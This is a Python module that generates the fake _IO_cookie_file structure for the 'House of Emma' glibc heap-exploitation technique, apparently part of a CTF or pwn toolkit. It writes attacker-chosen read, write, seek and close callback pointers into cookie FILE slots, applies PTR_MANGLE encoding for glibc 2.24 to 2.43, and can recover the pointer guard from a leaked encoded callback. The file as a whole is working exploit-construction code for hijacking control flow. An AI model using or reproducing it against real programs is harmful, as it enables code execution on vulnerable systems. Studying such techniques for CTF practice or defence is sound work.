"""House of Emma cookie FILE callback field plan."""

from __future__ import annotations

from dataclasses import dataclass


UINT64_LIMIT = 1 << 64
UINT64_MASK = UINT64_LIMIT - 1
FILE_COOKIE = 0xE0
FILE_READ_CALLBACK = 0xE8
FILE_IMAGE_SIZE = 0x108
COOKIE_FIELD_OFFSETS = (0xE0, 0xE8, 0xF0, 0xF8, 0x100)


@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str


def _check_uint64(name: str, value: int) -> None:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < 0 or value >= UINT64_LIMIT:
        raise ValueError(f"{name} must fit uint64")


def _pack64(value: int) -> bytes:
    _check_uint64("value", value)
    return value.to_bytes(8, "little")


def rol64(value: int, bits: int) -> int:
    value &= UINT64_MASK
    return ((value << bits) | (value >> (64 - bits))) & UINT64_MASK


def ror64(value: int, bits: int) -> int:
    return rol64(value, 64 - bits)


def encode_cookie_callback(callback_addr: int, pointer_guard: int, *, mangled: bool) -> int:
    """按 glibc cookie callback ABI 生成明文或 PTR_MANGLE 后的函数指针。"""

    if not mangled:
        return callback_addr
    return rol64(callback_addr ^ pointer_guard, 17)


def recover_pointer_guard(known_callback_addr: int, encoded_callback: int) -> int:
    """由已知明文 callback 和其 cookie 槽密文恢复 pointer_guard。"""

    return ror64(encoded_callback, 17) ^ known_callback_addr


def build_house_of_emma(
    *,
    version: str,
    file_addr: int,
    cookie_addr: int,
    callback_addr: int,
    pointer_guard: int | None = None,
    read_addr: int = 0,
    seek_addr: int = 0,
    close_addr: int = 0,
) -> tuple[MemoryWrite, ...]:
    """生成 `_IO_cookie_file` 的 cookie 与四个回调槽。

    version: 2.23 使用明文回调；2.24～2.43 要求 pointer_guard
        并生成 PTR_MANGLE。
    file_addr: fake FILE 地址；cookie_addr: `FILE+0xe0` 的 cookie 值。
    callback_addr: 要消费的 write 回调。
    read/seek/close_addr: 其余三个 callback 槽值。
    pointer_guard: 2.24+ 的 fs:0x30 派生值；未知时拒绝生成密文。
    """

    if version not in {f"2.{minor}" for minor in range(23, 44)}:
        raise ValueError("unsupported glibc version")

    for name, value in {
        "file_addr": file_addr,
        "cookie_addr": cookie_addr,
        "callback_addr": callback_addr,
        "read_addr": read_addr,
        "seek_addr": seek_addr,
        "close_addr": close_addr,
    }.items():
        _check_uint64(name, value)

    mangled = version != "2.23"
    if mangled and pointer_guard is None:
        raise ValueError("2.24+ requires pointer_guard")

    guard = 0 if pointer_guard is None else pointer_guard
    callback_values = (read_addr, callback_addr, seek_addr, close_addr)
    encoded_values = [
        encode_cookie_callback(value, guard, mangled=mangled)
        for value in callback_values
    ]

    image = bytearray(FILE_IMAGE_SIZE)
    image[FILE_COOKIE:FILE_COOKIE + 8] = _pack64(cookie_addr)
    for index, value in enumerate(encoded_values):
        offset = FILE_READ_CALLBACK + index * 8
        image[offset:offset + 8] = _pack64(value)

    return (
        MemoryWrite(file_addr, bytes(image), f"cookie FILE ({version})"),
    )
